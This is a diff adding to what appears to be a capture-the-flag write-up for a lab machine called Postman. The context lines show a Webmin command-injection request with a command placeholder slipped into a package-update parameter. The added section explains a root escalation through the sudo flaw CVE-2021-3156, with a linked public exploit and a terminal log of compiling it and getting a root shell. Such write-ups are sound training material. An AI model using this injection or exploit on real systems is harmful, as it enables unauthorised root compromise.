@@ -365,3 +365,19 @@ This webmin vulnerability is a command injection vulnerability in the /package-u
 ```
 mode=updates&search=&u=apt/apt&u=;{COMMAND};/apt&ok_top=Update+Selected+Packages
 ```
+
+### Alternative way of Privilege Escalation (CVE-2021-3156)
+Using linpeas, we find out that the server might be vulnerable to CVE-2021-3156. We can then download the exploit code from [here](https://github.com/worawit/CVE-2021-3156)
+
+Afterwards, we can then compile the exploit code and obtain root privileges
+
+```
+Matt@Postman:/tmp/exploit/CVE-2021-3156$ make
+mkdir libnss_x
+cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+cc -O3 -o exploit exploit.c
+Matt@Postman:/tmp/exploit/CVE-2021-3156$ ./exploit
+# id
+uid=0(root) gid=0(root) groups=0(root),1000(Matt)
+# 
+```
